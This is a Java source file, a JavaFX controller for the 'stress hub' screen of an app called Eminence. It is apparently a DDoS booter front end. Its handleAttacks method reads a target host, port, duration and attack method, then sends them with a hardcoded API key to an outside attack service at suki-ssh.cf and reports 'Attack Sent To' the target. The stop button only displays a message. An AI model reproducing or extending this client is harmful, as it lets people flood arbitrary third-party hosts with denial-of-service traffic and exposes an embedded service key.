package me.c1tad31.eminence.stresshub;

import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.fxml.Initializable;
import javafx.scene.control.Alert;
import javafx.scene.control.Button;
import javafx.scene.control.TextField;
import javafx.scene.input.MouseEvent;
import javafx.scene.layout.AnchorPane;
import me.c1tad31.eminence.utils.SceneController;

import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ResourceBundle;

public class StressHubController implements Initializable {

    private final SceneController sceneController = new SceneController();

    @FXML private Button close;
    @FXML private Button minimize;
    @FXML private TextField host;
    @FXML private TextField port;
    @FXML private TextField time;
    @FXML private TextField method;
    @FXML private Button startBtn;
    @FXML private Button stopBtn;
    @FXML private Button restartBtn;
    @FXML private AnchorPane background;

    @FXML
    private void handleClose(ActionEvent event) {
        sceneController.close(event);
    }

    @FXML
    private void handleMinimize(ActionEvent event) {
        sceneController.minimize(event);
    }

    @FXML
    private void dragStage(MouseEvent event) {
        sceneController.drag(event, background);
    }

    @FXML
    private void handleDashboard(ActionEvent event) throws IOException {
        sceneController.sceneDetails(event, "me/c1tad31/eminence/dashboard/dashboard.fxml", 817, 500);
    }

    @FXML
    private void handleStressHub(ActionEvent event) throws IOException {
        sceneController.sceneDetails(event, "me/c1tad31/eminence/stresshub/stresshub.fxml", 817, 500);
    }

    @FXML
    private void handleTools(ActionEvent event) throws IOException {
        sceneController.sceneDetails(event, "me/c1tad31/eminence/tools/tools.fxml", 817, 500);
    }

    @FXML
    private void handleAdmin(ActionEvent event) throws IOException {
        sceneController.sceneDetails(event, "me/c1tad31/eminence/admin/admin.fxml", 817, 500);
    }

    @FXML
    private void handleSettings(ActionEvent event) throws IOException {
        sceneController.sceneDetails(event, "me/c1tad31/eminence/settings/settings.fxml", 817, 500);
    }

    @FXML
    private void handleAttacks() {
        String ip = host.getText();
        int portDst = Integer.parseInt(port.getText());
        String amount = time.getText();
        String lol = method.getText();

        try {
            URL url = new URL(String.format("http://suki-ssh.cf:999/suki/api?key=citadellol1612&host=%s&port=%s&time=%s&method=%s", ip, portDst, amount, lol));
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.connect();

            int responseCode = connection.getResponseCode();
            if (responseCode == 200) {
                showAlert("Attack Sent To: " + ip + " On Port: " + portDst + " With Method: " + lol + " for: " + amount + " seconds");
            } else {
                showAlert("Connection Error unable to send attack!");
            }
        } catch (MalformedURLException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @FXML
    private void handleStopAttacks() {
        showAlert("Attack has been stopped!");
    }

    private void showAlert(String message) {
        Alert alert = new Alert(Alert.AlertType.CONFIRMATION);
        alert.setHeaderText(message);
        alert.show();
    }

    @Override
    public void initialize(URL location, ResourceBundle resources) {
        // Initialization code, if needed
    }
}
